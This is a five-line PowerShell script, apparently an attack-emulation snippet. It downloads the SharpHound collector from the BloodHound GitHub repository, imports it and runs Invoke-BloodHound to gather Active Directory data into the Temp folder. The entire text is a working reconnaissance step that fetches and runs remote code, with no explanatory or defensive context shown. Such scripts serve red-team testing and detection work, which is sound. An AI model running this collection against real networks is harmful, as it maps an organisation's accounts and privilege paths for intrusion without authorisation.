Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile ".\SharpHound.ps1"
import-module "./SharpHound.ps1"
try { Invoke-BloodHound -OutputDirectory $env:Temp }
catch { $_; exit $_.Exception.HResult }
Start-Sleep 5